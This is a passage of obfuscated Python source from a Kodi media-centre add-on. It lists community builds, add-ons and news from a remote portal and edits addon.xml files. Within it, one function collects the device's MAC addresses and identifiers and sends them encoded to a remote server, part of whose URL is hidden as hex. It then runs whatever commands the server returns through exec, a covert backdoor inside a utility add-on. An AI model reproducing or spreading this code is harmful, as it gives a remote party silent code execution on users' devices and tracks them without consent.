 IiII111i1i11 ( 'folder' , 'Podcasts' , str ( url ) + '&genre=podcasts' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Radio' , str ( url ) + '&genre=radio' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Religion' , str ( url ) + '&genre=religion' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Space' , str ( url ) + '&genre=space' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Sports' , str ( url ) + '&genre=sports' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Technology' , str ( url ) + '&genre=tech' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Trailers' , str ( url ) + '&genre=trailers' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'TV Shows' , str ( url ) + '&genre=tv' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Misc.' , str ( url ) + '&genre=other' , 'grab_builds' , '' , '' , '' , '' )
 if 79 - 79: I1ii11iIi11i - iIii1I11I1II1 % i1IIi / Oo0Ooo + II111iiii
 if o0O . getSetting ( 'adult' ) == 'true' :
  IiII111i1i11 ( 'folder' , 'XXX' , str ( url ) + '&genre=adult' , 'grab_builds' , '' , '' , '' , '' )
  if 95 - 95: ooOo
  if 48 - 48: OooO00OOoO00 / iIii1I11I1II1 % II111iiii
def OoOo0oO0 ( path , size ) :
 for IiI111I , oo0oO0 , ii1i1IiiIIII11111Ii in os . walk ( path ) :
  for oooO in ii1i1IiiIIII11111Ii :
   Ooo . update ( 0 , "Calulating..." , '[COLOR=dodgerblue]' + oooO + '[/COLOR]' , 'Please Wait' )
   IiiiII = os . path . join ( IiI111I , oooO )
   size += os . path . getsize ( IiiiII )
 return size
 if 75 - 75: O0 * i1IIi - OooO00OOoO00 / Oo % Oo / OoOoOO00
def oOo0O000Ooo0 ( default = "" , heading = "" , hidden = False ) :
 Iii1i1Ii = xbmc . Keyboard ( default , heading , hidden )
 if 23 - 23: OoOoOO00 - OO000 - ooOo / OoooooooOO
 Iii1i1Ii . doModal ( )
 if ( Iii1i1Ii . isConfirmed ( ) ) :
  return unicode ( Iii1i1Ii . getText ( ) , "utf-8" )
 return default
 if 12 - 12: OoooooooOO
 if 55 - 55: I1ii11iIi11i + I1ii11iIi11i
def o0o0OOo0OOoO ( ) :
 O0ooO = [ ]
 i1Ii1IiiIi1II = sys . argv [ 2 ]
 if len ( i1Ii1IiiIi1II ) >= 2 :
  o0oOoOooOOo = sys . argv [ 2 ]
  I1Ii11I11i1 = o0oOoOooOOo . replace ( '?' , '' )
  if ( o0oOoOooOOo [ len ( o0oOoOooOOo ) - 1 ] == '/' ) :
   o0oOoOooOOo = o0oOoOooOOo [ 0 : len ( o0oOoOooOOo ) - 2 ]
  IiII1 = I1Ii11I11i1 . split ( '&' )
  O0ooO = { }
  for O00o in range ( len ( IiII1 ) ) :
   iI1I1IOo0o0oOo0oO = { }
   iI1I1IOo0o0oOo0oO = IiII1 [ O00o ] . split ( '=' )
   if ( len ( iI1I1IOo0o0oOo0oO ) ) == 2 :
    O0ooO [ iI1I1IOo0o0oOo0oO [ 0 ] ] = iI1I1IOo0o0oOo0oO [ 1 ]
    if 20 - 20: oOO00 - iIii1I11I1II1
 return O0ooO
 if 25 - 25: OooO00OOoO00 + OoOoOO00
def o00OoOOoO ( protocol ) :
 if sys . platform == 'win32' :
  for iii1i1Iiiiiii in os . popen ( "ipconfig /all" ) :
   if iii1i1Iiiiiii . lstrip ( ) . startswith ( 'Physical Address' ) :
    OOoo0 = iii1i1Iiiiiii . split ( ':' ) [ 1 ] . strip ( ) . replace ( '-' , ':' )
    break
    if 7 - 7: I1IiiI % i1Ii11i1i * oOO00 + OoOoOO00 / OoOoOO00
 if xbmc . getCondVisibility ( 'System.Platform.Android' ) :
  if protcol == 'wifi' :
   IiiIiIIi1 = open ( '/sys/class/net/wlan0/address' , mode = 'r' )
  else :
   IiiIiIIi1 = open ( '/sys/class/net/eth0/address' , mode = 'r' )
  OOoo0 = IiiIiIIi1 . read ( )
  OOoo0 = OOoo0 [ : 17 ]
  IiiIiIIi1 . close ( )
  if 34 - 34: II111iiii % i11iIiiIii % OoO0O00 . OoOoOO00 + i11iIiiIii
 else :
  if protocol == 'wifi' :
   for iii1i1Iiiiiii in os . popen ( "/sbin/ifconfig" ) :
    if iii1i1Iiiiiii . find ( 'wlan0' ) > - 1 :
     OOoo0 = iii1i1Iiiiiii . split ( ) [ 4 ]
     break
  else :
   for iii1i1Iiiiiii in os . popen ( "/sbin/ifconfig" ) :
    if iii1i1Iiiiiii . find ( 'eth0' ) > - 1 :
     OOoo0 = iii1i1Iiiiiii . split ( ) [ 4 ]
     break
 return str ( OOoo0 )
 if 53 - 53: i11iIiiIii - i11iIiiIii + OO000 - OoOoOO00 % ooOo - OooO00OOoO00
def OO00o0O000O ( ) :
 i1iOO = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 Ooo = xbmcgui . DialogProgress ( )
 Ooo . create ( "Gotham Addon Fix" , "Please wait whilst your addons" , '' , 'are being made Gotham compatible.' )
 if 28 - 28: OooO00OOoO00 * O0 - ooOo
 for oOOoOOooO0 in glob . glob ( os . path . join ( i1iOO , '*.*' ) ) :
  if 34 - 34: OOOOOOoo0O % i11iIiiIii + i11iIiiIii - OOOOOOoo0O
  for file in glob . glob ( os . path . join ( oOOoOOooO0 , '*.*' ) ) :
   if 2 - 2: II111iiii + i1IIi
   if 'addon.xml' in file :
    Ooo . update ( 0 , "Fixing" , file , 'Please Wait' )
    OOOOO0o0OOo = open ( file ) . read ( )
    O0oO0O = OOOOO0o0OOo . replace ( 'addon="xbmc.python" version="1.0"' , 'addon="xbmc.python" version="2.1.0"' ) . replace ( 'addon="xbmc.python" version="2.0"' , 'addon="xbmc.python" version="2.1.0"' )
    oooO = open ( file , mode = 'w' )
    oooO . write ( str ( O0oO0O ) )
    oooO . close ( )
    if 68 - 68: Oo + OO000
 OO0o = xbmcgui . Dialog ( )
 OO0o . ok ( "Your addons have now been made compatible" , "If you still find you have addons that aren't working please run the addon so it throws up a script error, upload a log and post details on the relevant support forum." )
 if 58 - 58: oOO00 * OO000 . i1IIi
 if 19 - 19: ooOo
def O0oooooO ( ) :
 OO0o = xbmcgui . Dialog ( )
 IIi1 = xbmcgui . Dialog ( ) . yesno ( 'Convert Addons To Gotham' , 'This will edit your addon.xml files so they show as Gotham compatible. It\'s doubtful this will have any effect on whether or not they work but it will get rid of the annoying incompatible pop-up message. Do you wish to continue?' )
 if 44 - 44: OoO0O00 + OooO00OOoO00 % OoO0O00 + i1IIi + OOOOOOoo0O + O0
 if IIi1 == 1 :
  OO00o0O000O ( )
  if 18 - 18: iIii1I11I1II1 % iIii1I11I1II1 % ooOo + I1IiiI % o0oOOoo / OO000
  if 36 - 36: OoOoOO00 . i11iIiiIii
def oO00O0o0oOOO ( url ) :
 if 96 - 96: I1IiiI - iIii1I11I1II1
 if o0O . getSetting ( 'adult' ) == 'true' :
  o00OoO0o0 = 'yes'
  if 25 - 25: OoooooooOO . OO000 % OOOOOOoo0O . oOO00
 else :
  o00OoO0o0 = 'no'
  if 67 - 67: OoooooooOO + i1Ii11i1i / o0oOOoo
 if url == 'popular' :
  O0oo = 'http://noobsandnerds.com/TI/AddonPortal/popular.php?adult=%s' % ( o00OoO0o0 )
 elif url != 'popular' :
  O0oo = 'http://noobsandnerds.com/TI/AddonPortal/sortby_bak.php?sortx=name&user=%s&adult=%s&%s' % ( oOOoo00O0O , o00OoO0o0 , url )
  if 50 - 50: i1Ii11i1i - II111iiii
 i11i1ii1I = o0OO0o0o00o ( O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 33 - 33: oOO00 / oOO00 . i11iIiiIii * I1ii11iIi11i + o0oOOo0O0Ooo
 i1iIiIi1I = re . compile ( 'name="(.+?)"  <br> downloads="(.+?)"  <br> icon="(.+?)"  <br> broken="(.+?)"  <br> UID="(.+?)"  <br>' , re . DOTALL ) . findall ( i11i1ii1I )
 if i1iIiIi1I == [ ] :
  if 16 - 16: oOO00
  i1iIiIi1I = re . compile ( 'name="(.+?)" <br> downloads="(.+?)" <br> icon="(.+?)" <br> broken="(.+?)" <br> UID="(.+?)" <br>' , re . DOTALL ) . findall ( i11i1ii1I )
  if 10 - 10: OoOoOO00 . oOO00 * iIii1I11I1II1 - ooOo - OoOoOO00 / i1Ii11i1i
 if i1iIiIi1I != [ ] and url != 'popular' :
  II1I11 ( O0oo , 'addons' )
  if 20 - 20: i1Ii11i1i . i1IIi
  for oOo00O0oo00o0 , IiiIiI1Ii1i , oOOo000oOoO0 , O0OOO0OOooo00 , i1iiiI in i1iIiIi1I :
   if 33 - 33: o0oOOo0O0Ooo % oOO00 - iIii1I11I1II1 % Oo + i1Ii11i1i - i11iIiiIii
   if O0OOO0OOooo00 == '0' :
    IiII111i1i11 ( 'addonfolder' , oOo00O0oo00o0 + '[COLOR=lime] [' + IiiIiI1Ii1i + ' downloads][/COLOR]' , i1iiiI , 'addon_final_menu' , oOOo000oOoO0 , '' , '' )
    if 91 - 91: OoooooooOO . iIii1I11I1II1 / i11iIiiIii
   if O0OOO0OOooo00 == '1' :
    IiII111i1i11 ( 'addonfolder' , '[COLOR=red]' + oOo00O0oo00o0 + ' [REPORTED AS BROKEN][/COLOR]' , i1iiiI , 'addon_final_menu' , oOOo000oOoO0 , '' , '' )
    if 80 - 80: I1IiiI
 elif i1iIiIi1I != [ ] and url == 'popular' :
  for oOo00O0oo00o0 , IiiIiI1Ii1i , oOOo000oOoO0 , O0OOO0OOooo00 , i1iiiI in i1iIiIi1I :
   if 58 - 58: ooOo + I1ii11iIi11i % OoOoOO00
   if O0OOO0OOooo00 == '0' :
    IiII111i1i11 ( 'addonfolder' , oOo00O0oo00o0 + '[COLOR=lime] [' + IiiIiI1Ii1i + ' downloads][/COLOR]' , i1iiiI , 'addon_final_menu' , oOOo000oOoO0 , '' , '' )
    if 22 - 22: iIii1I11I1II1 - OO000 / I1IiiI * oOO00
   if O0OOO0OOooo00 == '1' :
    IiII111i1i11 ( 'addonfolder' , '[COLOR=red]' + oOo00O0oo00o0 + ' [REPORTED AS BROKEN][/COLOR]' , i1iiiI , 'addon_final_menu' , oOOo000oOoO0 , '' , '' )
    if 26 - 26: o0oOOo0O0Ooo + Oo - o0oOOo0O0Ooo + Oo0Ooo . ooOo
 elif '&redirect' in url :
  iIiI1 = OO0o . yesno ( 'No Content Found' , 'This add-on cannot be found on the Add-on Portal.' , '' , 'Would you like to remove this item from your setup?' )
  if 97 - 97: i1IIi
  if iIiI1 == 1 :
   print "### Need to add remove function to code still"
   if 46 - 46: I1ii11iIi11i
 else :
  OO0o . ok ( 'No Content Found' , 'Sorry no content can be found that matches' , 'your search criteria.' , '' )
  if 30 - 30: OoO0O00 / O0 * o0oOOo0O0Ooo * i1Ii11i1i + OoooooooOO * OOOOOOoo0O
  if 23 - 23: OooO00OOoO00
def I1Io0OO ( url ) :
 if zip == '' :
  OO0o . ok ( 'Storage/Download Folder Not Set' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  o0O . openSettings ( sys . argv [ 0 ] )
  if 11 - 11: ooOo
 if o0O . getSetting ( 'adult' ) == 'true' :
  o00OoO0o0 = ''
  if 62 - 62: OoooooooOO % ooOo * II111iiii * i1Ii11i1i * i1Ii11i1i / o0oOOoo
 else :
  o00OoO0o0 = 'no'
  if 90 - 90: i1Ii11i1i . II111iiii . I1ii11iIi11i
 if not 'id=' in url :
  O0oo = 'http://noobsandnerds.com/TI/Community_Builds/sortby.php?sortx=name&orderx=ASC&adult=%s&%s' % ( o00OoO0o0 , url )
  i11i1ii1I = o0OO0o0o00o ( O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  if 32 - 32: o0oOOoo - OoO0O00 . OOOOOOoo0O . OOOOOOoo0O % i1IIi * OO000
  i1iIiIi1I = re . compile ( 'name="(.+?)"  <br> id="(.+?)"  <br> Thumbnail="(.+?)"  <br> Fanart="(.+?)"  <br> downloads="(.+?)"  <br> <br>' , re . DOTALL ) . findall ( i11i1ii1I )
  if i1iIiIi1I == [ ] :
   if 65 - 65: OOOOOOoo0O / o0oOOoo . II111iiii
   i1iIiIi1I = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> Thumbnail="(.+?)" <br> Fanart="(.+?)" <br> downloads="(.+?)" <br> <br>' , re . DOTALL ) . findall ( i11i1ii1I )
  II1I11 ( url , 'communitybuilds' )
  if 90 - 90: OooO00OOoO00
  for oOo00O0oo00o0 , id , o00oooo , ooo0Oo00O , IiiIiI1Ii1i in i1iIiIi1I :
   Ii1I1Ii ( oOo00O0oo00o0 + '[COLOR=lime] (' + IiiIiI1Ii1i + ' downloads)[/COLOR]' , id + url , 'community_menu' , o00oooo , ooo0Oo00O , id , '' , '' , '' , '' )
   if 28 - 28: oOO00 + OoOoOO00 . oOO00 - OO000 % i1IIi % iIii1I11I1II1
 if 'id=1' in url : O0oo = iI111I11I1I1
 if 'id=2' in url : O0oo = iIii1
 if 'id=3' in url : O0oo = O0OoO000O0OO
 if 'id=4' in url : O0oo = II
 if 'id=5' in url : O0oo = OooO0
 if 100 - 100: Oo0Ooo - Oo * o0oOOoo * OoO0O00
 i11i1ii1I = o0OO0o0o00o ( O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i1iIiIi1I = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( i11i1ii1I )
 if 64 - 64: OooO00OOoO00 / II111iiii / OoO0O00 - o0oOOoo * iIii1I11I1II1 . OOOOOOoo0O
 for oOo00O0oo00o0 , url , oooO00o0 , o0o00oO0oo000 , IiIi11Iii in i1iIiIi1I :
  if not 'viewport' in oOo00O0oo00o0 :
   IiII111i1i11 ( 'addon' , oOo00O0oo00o0 , url , 'restore_local_CB' , oooO00o0 , o0o00oO0oo000 , IiIi11Iii , '' )
   if 25 - 25: Oo - OO000 . OooO00OOoO00
   if 57 - 57: o0oOOo0O0Ooo + Oo0Ooo * I1ii11iIi11i - o0oOOoo % iIii1I11I1II1 - OO000
def III1I11II11I ( url ) :
 O0oo = 'http://noobsandnerds.com/TI/HardwarePortal/sortby.php?sortx=Added&orderx=DESC&%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 78 - 78: I1ii11iIi11i . i1Ii11i1i . i1Ii11i1i . OooO00OOoO00 % OOOOOOoo0O
 i1iIiIi1I = re . compile ( 'name="(.+?)"  <br> id="(.+?)"  <br> thumb="(.+?)"  <br><br>' , re . DOTALL ) . findall ( i11i1ii1I )
 if i1iIiIi1I == [ ] :
  if 26 - 26: o0oOOoo + OoO0O00 / OoOoOO00 . II111iiii * OO000
  i1iIiIi1I = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> thumb="(.+?)" <br><br>' , re . DOTALL ) . findall ( i11i1ii1I )
 II1I11 ( O0oo , 'hardware' )
 if 21 - 21: I1IiiI - I1IiiI + OOOOOOoo0O % I1IiiI * ooOo
 for oOo00O0oo00o0 , id , O0o0 in i1iIiIi1I :
  IiII111i1i11 ( 'folder2' , oOo00O0oo00o0 , id , 'hardware_final_menu' , O0o0 , '' , '' )
  if 64 - 64: OoooooooOO + Oo0Ooo
  if 27 - 27: OOOOOOoo0O + OO000 * I1IiiI * I1ii11iIi11i . i1Ii11i1i
def OOO0ooO0Oo0 ( url ) :
 O0oo = 'http://noobsandnerds.com/TI/LatestNews/sortby.php?sortx=item_date&orderx=DESC&%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 54 - 54: iIii1I11I1II1 * OOOOOOoo0O * oOO00
 i1iIiIi1I = re . compile ( 'name="(.+?)"  <br> date="(.+?)"  <br> source="(.+?)"  <br> id="(.+?)"  <br><br>' , re . DOTALL ) . findall ( i11i1ii1I )
 if i1iIiIi1I == [ ] :
  if 30 - 30: o0oOOoo . i11iIiiIii + Oo - II111iiii
  i1iIiIi1I = re . compile ( 'name="(.+?)" <br> date="(.+?)" <br> source="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( i11i1ii1I )
 for oOo00O0oo00o0 , IiiIiiiiI1III , II111111 , id in i1iIiIi1I :
  if 27 - 27: i1Ii11i1i * Oo0Ooo / o0oOOoo
  if "OpenELEC" in II111111 :
   IiII111i1i11 ( '' , oOo00O0oo00o0 + '  (' + IiiIiiiiI1III + ')' , id , 'news_menu' , 'OpenELEC.png' , '' , '' )
   if 14 - 14: i1IIi * iIii1I11I1II1 - OO000 * OoOoOO00 - OOOOOOoo0O / ooOo
  if "Official" in II111111 :
   IiII111i1i11 ( '' , oOo00O0oo00o0 + '  (' + IiiIiiiiI1III + ')' , id , 'news_menu' , 'XBMC.png' , '' , '' )
   if 73 - 73: I1ii11iIi11i - OoOoOO00 * O0 - OoOoOO00 - OoO0O00
  if "Raspbmc" in II111111 :
   IiII111i1i11 ( '' , oOo00O0oo00o0 + '  (' + IiiIiiiiI1III + ')' , id , 'news_menu' , 'Raspbmc.png' , '' , '' )
   if 96 - 96: I1ii11iIi11i - O0
  if "XBMC4Xbox" in II111111 :
   IiII111i1i11 ( '' , oOo00O0oo00o0 + '  (' + IiiIiiiiI1III + ')' , id , 'news_menu' , 'XBMC4Xbox.png' , '' , '' )
   if 35 - 35: Oo . OooO00OOoO00 . i1Ii11i1i - OooO00OOoO00 % OooO00OOoO00 + i1Ii11i1i
  if "noobsandnerds" in II111111 :
   IiII111i1i11 ( '' , oOo00O0oo00o0 + '  (' + IiiIiiiiI1III + ')' , id , 'news_menu' , 'noobsandnerds.png' , '' , '' )
   if 99 - 99: o0oOOo0O0Ooo + Oo
   if 34 - 34: i1Ii11i1i * o0oOOo0O0Ooo . I1IiiI % i11iIiiIii
def Oo0OO0 ( url ) :
 O0oo = 'http://noobsandnerds.com/TI/TutorialPortal/sortby.php?sortx=Name&orderx=ASC&%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 74 - 74: OO000 - OoooooooOO
 i1iIiIi1I = re . compile ( 'name="(.+?)"  <br> about="(.+?)"  <br> id="(.+?)"  <br><br>' , re . DOTALL ) . findall ( i11i1ii1I )
 if i1iIiIi1I == [ ] :
  if 19 - 19: iIii1I11I1II1 + i1Ii11i1i . i1Ii11i1i - Oo0Ooo
  i1iIiIi1I = re . compile ( 'name="(.+?)" <br> about="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( i11i1ii1I )
 II1I11 ( O0oo , 'tutorials' )
 if 41 - 41: I1IiiI . Oo0Ooo . oOO00 % OoooooooOO + OoO0O00
 for oOo00O0oo00o0 , II1IiI1iI , id in i1iIiIi1I :
  IiII111i1i11 ( 'folder' , oOo00O0oo00o0 , id , 'tutorial_final_menu' , 'Tutorials.png' , '' , II1IiI1iI )
  if 17 - 17: i11iIiiIii - i11iIiiIii + I1ii11iIi11i * o0oOOoo * ooOo / OoooooooOO
def i1II111ii1ii ( url ) :
 I11 = 'true'
 O0ooOoO0OO000 = xbmc . Player ( ) . isPlaying ( )
 if O0ooOoO0OO000 == 0 :
  OOoOOO = III1 ( )
  O00oOOoOOOOO = 0
  ii1IIiiIi1111Ii1 = 0
  if 31 - 31: o0oOOo0O0Ooo * OooO00OOoO00 - i11iIiiIii - I1IiiI
  xbmc . executebuiltin ( "ActivateWindow(busydialog)" )
  while O00oOOoOOOOO != 1 and ii1IIiiIi1111Ii1 != 1 :
   if 19 - 19: OOOOOOoo0O . OooO00OOoO00 * OoooooooOO - Oo + O0 * i1Ii11i1i
   if 90 - 90: i1IIi . ooOo / i1Ii11i1i . Oo / i1Ii11i1i
   if I11 == 'true' :
    print "### URL: http://tlbb.me/comm.php?z=c&x=" + iII11 ( 'e' , OOoOOO )
   i11i1ii1I = i1111I1iii1 ( url + iII11 ( 'e' , OOoOOO ) )
   if i11i1ii1I != '' and not 'sleep' in i11i1ii1I :
    i11i1ii1I = iII11 ( 'd' , i11i1ii1I ) . replace ( '\n' , ';' ) . replace ( '|_|' , ' ' ) . replace ( '|!|' , '\n' )
   if I11 == 'true' :
    try :
     print "### Return: " + i11i1ii1I
    except :
     pass
     if 89 - 89: oOO00 - i1IIi - oOO00
   if i11i1ii1I == '' :
    if I11 == 'true' :
     print "### Blank page returned"
    ii1IIiiIi1111Ii1 = 1
    if 74 - 74: OoO0O00 % OoO0O00
    if 28 - 28: OoOoOO00 % ooOo - Oo + Oo + ooOo / iIii1I11I1II1
   if not '<body' in i11i1ii1I and i11i1ii1I != '' :
    oo0oOOoOoo = re . compile ( 'com(.+?)="' ) . findall ( i11i1ii1I )
    OOOo0Ooo0o00o = oo0oOOoOoo [ 0 ] if ( len ( oo0oOOoOoo ) > 0 ) else ''
    oOoOooO = re . compile ( '="(.+?)endcom"' ) . findall ( i11i1ii1I )
    o0OoOOoooooOO = oOoOooO [ 0 ] if ( len ( oOoOooO ) > 0 ) else 'End'
    if 88 - 88: i1IIi
    O0ooOo0Oooo = re . compile ( '<favourite[\s\S]*?</favourite>' ) . findall ( o0OoOOoooooOO )
    I1iiIIiI11I = O0ooOo0Oooo [ 0 ] if ( len ( O0ooOo0Oooo ) > 0 ) else 'None'
    if 29 - 29: OooO00OOoO00 + ooOo % o0oOOoo + OoOoOO00
    if I11 == 'true' :
     if 92 - 92: o0oOOo0O0Ooo
     print "### command: " + o0OoOOoooooOO
     print "### SF_command: " + I1iiIIiI11I
     if 37 - 37: ooOo
    i1111I1iii1 ( binascii . unhexlify ( '687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d' ) + iII11 ( 'e' , OOoOOO ) + '&y=' + OOOo0Ooo0o00o )
    if 18 - 18: oOO00 * i11iIiiIii + iIii1I11I1II1 % OooO00OOoO00 + i1IIi - OoO0O00
    if I11 == 'true' :
     print "### COMMAND *CLEANED: " + o0OoOOoooooOO . replace ( '|#|' , ';' )
     print "### LINK *ORIG: " + i11i1ii1I
    if I1iiIIiI11I != 'None' :
     iiIi1I1i1 = open ( Ii1iIiII1ii1 , mode = 'w+' )
     iiIi1I1i1 . write ( I1iiIIiI11I )
     iiIi1I1i1 . close ( )
     if 85 - 85: OoO0O00 * OooO00OOoO00 + OoO0O00
    elif o0OoOOoooooOO != 'End' and not 'sleep' in i11i1ii1I :
     if ';' in o0OoOOoooooOO :
      iI1ii = o0OoOOoooooOO . split ( ';' )
      for iiiiIii11i1 in iI1ii :
       if I11 == 'true' :
        print "### command *CLEAN: " + iiiiIii11i1 . replace ( '|#|' , ';' )
       exec iiiiIii11i1 . replace ( '|#|' , ';' )
       xbmc . sleep ( 500 )
       while xbmc . Player ( ) . isPlaying ( ) :
        xbmc . sleep ( 500 )
     else :
      exec o0OoOOoooooOO . replace ( '|#|' , ';' )
      xbmc . sleep ( 500 )
      while xbmc . Player ( ) . isPlaying ( ) :
       xbmc . sleep ( 500 )
      if os . path . exists ( Ii1iIiII1ii1 ) :
       os . remove ( Ii1iIiII1ii1 )
       if 20 - 20: Oo * ooOo
    elif o0OoOOoooooOO == 'End' :
     if 'sleep' in i11i1ii1I :
      IiiIiIIi1 = open ( ooOooo000oOO , 'r' )
      IiiI = IiiIiIIi1 . read ( )
      IiiIiIIi1 . close ( )
      OOOoooOo00O = str ( i11i1ii1I [ 6 : ] )
      if I11 == 'true' :
       print "### Sleep: " + OOOoooOo00O
      if str ( OOOoooOo00O ) != str ( IiiI ) :
       oo00IIIIIIIiI = open ( ooOooo000oOO , 'w+' )
       oo00IIIIIIIiI . write ( OOOoooOo00O )
       oo00IIIIIIIiI . close ( )
       if I11 == 'true' :
        print "### Changed timer to " + OOOoooOo00O
       xbmc . executebuiltin ( 'StopScript(special://home/addons/plugin.program.tbs/service.py)' )
       xbmc . executebuiltin ( 'RunScript(special://home/addons/plugin.program.tbs/service.py)' )
      else :
       if I11 == 'true' :
        print "### Timer same, no changes required"
     iiIIiI1I ( 'Updates Complete' , 'No more updates to show' , '1000' , os . path . join ( ooooooO0oo , 'plugin.program.tbs' , 'resources' , 'tick.png' ) )
     xbmc . executebuiltin ( 'UpdateLocalAddons' )
     xbmc . executebuiltin ( 'UpdateAddonRepos' )
     O00oOOoOOOOO = 1
     if 67 - 67: I1ii11iIi11i % OoooooooOO
     if 41 - 41: OoO0O00 / oOO00 + i1Ii11i1i . i1Ii11i1i / ooOo
  try :
   xbmc . executebuiltin ( "Dialog.Close(busydialog)" )
  except :
   raise exception
   if 74 - 74: OO000 % i11iIiiIii . O0 * I1IiiI * i1IIi * OoooooooOO
   if 22 - 22: i1Ii11i1i + OOOOOOoo0O - OooO00OOoO00 + iIii1I11I1II1 / i1Ii11i1i - OoooooooOO
def III1 ( ) :
 try :
  IiII1111I = o00OoOOoO ( 'wifi' )
 except :
  IiII1111I = 'Unknown'
 try :
  iiIIii111Ii = o00OoOOoO ( 'eth0' )
 except :
  iiIIii111Ii = 'Unknown'
 try :
  OO000oooOo000 = iIiiII ( )
 except :
  OO000oooOo000 = 'Unknown'
 try :
  o0oO0o0Oo0 = Ii1 ( )
 except :
  o0oO0o0Oo0 = 'Unknown'
  if 20 - 20: i1Ii11i1i - OoOoOO00
 OOoOOO = IiII1111I + '&' + OO000oooOo000 + '&' + o0oO0o0Oo0 + '&' + iiIIii111Ii . replace ( ' ' , '%20' )
 return OOoOOO
 if 91 - 91: i1IIi
 if 31 - 31: i11iIiiIii + OO000 % OoOoOO00
def I1Io0Oo00 ( ) :
 oOOO0 = I1II11IIi11i ( 'Enter Key Phrase To Search For' )
 xbmc . executebuiltin ( "ActivateWindow(busydialog)" )
 OOoOOO = III1 ( )
 if 67 - 67: iIii1I11I1II1 - OOOOOOoo0O
 O0oo = 'http://tlbb.me/catsearch.php?search=' + iII11 ( 'e' , OOoOOO ) + '&k=' + iII11 ( 'e' , oOOO0 )
 if I11 == 'true' :
  if 81 - 81: O0
  print "### URL: http://tlbb.me/catsearch.php?search=" + iII11 ( 'e' , OOoOOO ) + '&k=' + iII11 ( 'e' , oOOO0 )
 try :
  i11i1ii1I = iII11 ( 'd' , i1111I1iii1 ( O0oo ) )
  if I11 == 'true' :
   print "### Return orig: " + i11i1ii1I
   if 38 - 38: OOOOOOoo0O
   if 78 - 78: i11iIiiIii . oOO00 % OoooooooOO - oOO00 - oOO00 + OO000
   if 11 - 11: OooO00OOoO00
   if 20 - 20: O0 . i11iIiiIii * i1IIi % O0 . I1IiiI
  i1iIiIi1I = re . compile ( 'n="(.+?)"l="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
  for oOo00O0oo00o0 , o0OoIiiiiiiI111i in i1iIiIi1I :
   IiII111i1i11 ( 'folder' , oOo00O0oo00o0 , o0OoIiiiiiiI111i , 'install_venz' , '' , '' , '' , '' )
 except :
  iiIIiI1I ( 'No Response from server' , 'Sorry Please try later' , '1000' , os . path . join ( ooooooO0oo , 'plugin.program.tbs' , 'resources' , 'cross.png' ) )
 try :
  xbmc . executebuiltin ( "Dialog.Close(busydialog)" )
 except :
  raise exception
  if 19 - 19: OoooooooOO * ooOo
  if 60 - 60: II111iiii - OOOOOOoo0O + o0oOOo0O0Ooo % Oo
def oooO0O0o00o ( url ) :
 i11i1ii1I = i1111I1iii1 ( url )
 o0O00oo0O = 0
 if I11 == 'true' :
  print i11i1ii1I
 if i11i1ii1I == "record added sucessfully" :
  i1II111ii1ii ( 'http://tlbb.me/comm.php?z=c&x=' )
  o0O00oo0O = 1
  xbmc . executebuiltin ( 'Back' )
 else :
  try :
   i11i1ii1I = iII11 ( 'd' , i11i1ii1I ) . replace ( '|_|' , ' ' ) . replace ( '|!|' , '\n' )
   if I11 == 'true' :
    print i11i1ii1I
   o0O00oo0O = 1
  except :
   pass
 if o0O00oo0O == 1 :
  i1iIiIi1I = re . compile ( 'n="(.+?)"t="(.+?)"d="(.+?)"l="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
  for oOo00O0oo00o0 , O0o0 , i1iIi , i11i1ii1I in i1iIiIi1I :
   IiII111i1i11 ( '' , oOo00O0oo00o0 , i11i1ii1I , 'openlink' , O0o0 , '' , '' , i1iIi )
   if 75 - 75: OO000 + o0oOOoo / OoooooooOO
   if 59 - 59: Oo0Ooo
def i11I1Ii1Iiii1 ( function ) :
 OOoOOO = III1 ( )
 if "add_menu" in function or "remove_menu" in function :
  if 64 - 64: OO000 . OoooooooOO - I1ii11iIi11i
  O0oo = 'http://tlbb.me/catmenu.php?' + function + '&x=' + iII11 ( 'e' , OOoOOO )
  if I11 == 'true' :
   print "### URL: http://tlbb.me/catsearch.php?k=" + function + '&z=s&x=' + iII11 ( 'e' , OOoOOO )
  i11i1ii1I = iII11 ( 'd' , i1111I1iii1 ( O0oo ) )
  i1iIiIi1I = re . compile ( 'n="(.+?)"l="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
  for oOo00O0oo00o0 , o0OoIiiiiiiI111i in i1iIiIi1I :
   if function == 'add_menu' :
    if oOo00O0oo00o0 == "Add%20Menu" or oOo00O0oo00o0 == "Add Menu" :
     oooO0O0o00o ( o0OoIiiiiiiI111i )
   if function == 'remove_menu' :
    if oOo00O0oo00o0 == "Remove%20Menu" or oOo00O0oo00o0 == "Remove Menu" :
     oooO0O0o00o ( o0OoIiiiiiiI111i )
 else :
  try :
